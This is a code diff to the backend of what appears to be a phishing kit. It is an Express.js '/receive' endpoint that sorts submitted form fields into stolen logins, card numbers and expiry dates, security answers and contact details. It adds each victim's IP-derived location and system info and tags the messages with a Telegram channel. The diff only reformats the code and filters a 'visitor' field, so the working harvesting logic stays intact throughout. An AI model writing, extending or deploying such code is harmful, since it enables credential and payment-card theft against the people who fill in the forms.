@@ -212,6 +212,7 @@ app.post('/receive', async (req, res) => {
   const myObjects = Object.keys(myObject);
   
   // Convert myObjects to lowercase for case insensitive checks
+// Convert myObjects to lowercase for case insensitive checks
 const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
 if (lowerCaseMyObjects.includes('password')) {
@@ -219,27 +220,27 @@ if (lowerCaseMyObjects.includes('password')) {
                `👤 LOGIN [${visitor}]\n\n`;
 
     for (const key of myObjects) {
-      if (key !== 'visitor') {
-        console.log(`${key}: ${myObject[key]}`);
-        message += `${key}: ${myObject[key]}\n`;
-      }
+        if (key.toLowerCase() !== 'visitor') {
+            console.log(`${key}: ${myObject[key]}`);
+            message += `${key}: ${myObject[key]}\n`;
+        }
     }
 
     message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-      `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-      `CITY             : ${ipAddressInformation.location.city}\n` +
-      `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-      `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-      `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-      `💻 SYSTEM INFO\n` +
-      `USER AGENT       : ${userAgent}\n` +
-      `SYSTEM LANGUAGE  : ${systemLang}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
+        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+        `💻 SYSTEM INFO\n` +
+        `USER AGENT       : ${userAgent}\n` +
+        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
       
-      res.send('dn');
+    res.send('dn');
 }
 
 if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
@@ -247,14 +248,16 @@ if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes
                `👤 CARD INFO [${visitor}]\n\n`;
 
     for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+        if (key.toLowerCase() !== 'visitor') {
+            console.log(`${key}: ${myObject[key]}`);
+            message += `${key}: ${myObject[key]}\n`;
+        }
     }
 
     message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
 }
@@ -264,14 +267,16 @@ if (lowerCaseMyObjects.includes('message')) {
                `👤 SECURITY Q&A [${visitor}]\n\n`;
 
     for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+        if (key.toLowerCase() !== 'visitor') {
+            console.log(`${key}: ${myObject[key]}`);
+            message += `${key}: ${myObject[key]}\n`;
+        }
     }
 
     message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
 }
@@ -281,14 +286,16 @@ if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumb
                `👤 CONTACT INFO [${visitor}]\n\n`;
 
     for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+        if (key.toLowerCase() !== 'visitor') {
+            console.log(`${key}: ${myObject[key]}`);
+            message += `${key}: ${myObject[key]}\n`;
+        }
     }
 
     message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
 }
